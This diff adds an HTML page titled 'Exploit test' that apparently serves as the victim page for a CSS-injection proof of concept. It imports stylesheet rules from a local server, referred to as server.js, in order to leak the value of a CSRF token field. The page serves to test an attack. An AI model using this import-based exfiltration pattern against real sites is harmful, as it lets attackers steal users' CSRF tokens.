@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Exploit test</title>
+        <style>
+            /* /base as defined in server.js */
+            @import url("//localhost:5001/base");
+        </style>
+    </head>
+    <body>
+        <div>
+            <form action="" method="post">
+                <input type="text" />
+                <input
+                    type="text"
+                    class="csrf"
+                    value="97d12ef61b8fc45541ef3d4e3012b16a"
+                />
+                <!-- this input tree is body.div.form.input so in server.js => ["body", "div", "form", "input"] -->
+            </form>
+        </div>
+    </body>
+</html>
